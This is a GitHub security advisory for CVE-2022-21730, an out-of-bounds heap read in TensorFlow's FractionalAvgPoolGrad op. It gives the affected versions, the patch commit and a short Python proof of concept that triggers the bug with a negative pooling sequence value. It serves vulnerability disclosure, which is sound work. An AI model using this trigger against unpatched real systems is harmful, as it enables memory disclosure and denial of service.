# [H] Out of bounds read in Tensorflow

## Summary
Severity: High
Advisory: GHSA-vjg4-v33c-ggc4
CVE: CVE-2022-21730
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H (CVSS_V3)
Published: 2022-02-09
Source: https://github.com/advisories/GHSA-vjg4-v33c-ggc4
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.5.3
- PyPI: `tensorflow` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow` — affected >=2.7.0 <2.7.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.5.3
- PyPI: `tensorflow-cpu` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow-cpu` — affected >=2.7.0 <2.7.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.5.3
- PyPI: `tensorflow-gpu` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow-gpu` — affected >=2.7.0 <2.7.1

## Details
### Impact 
The [implementation of `FractionalAvgPoolGrad`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_avg_pool_op.cc#L209-L360) does not consider cases where the input tensors are invalid allowing an attacker to read from outside of bounds of heap:

```python
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.FractionalAvgPoolGrad(
    orig_input_tensor_shape=[2,2,2,2],
    out_backprop=[[[[1,2], [3, 4], [5, 6]], [[7, 8], [9,10], [11,12]]]],
    row_pooling_sequence=[-10,1,2,3],
    col_pooling_sequence=[1,2,3,4],
    overlapping=True)
  return y
    
test()
```

### Patches
We have patched the issue in GitHub commit [002408c3696b173863228223d535f9de72a101a9](https://github.com/tensorflow/tensorflow/commit/002408c3696b173863228223d535f9de72a101a9).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vjg4-v33c-ggc4
- https://nvd.nist.gov/vuln/detail/CVE-2022-21730
- https://github.com/tensorflow/tensorflow/commit/002408c3696b173863228223d535f9de72a101a9
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2022-54.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2022-109.yaml
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_avg_pool_op.cc#L209-L360
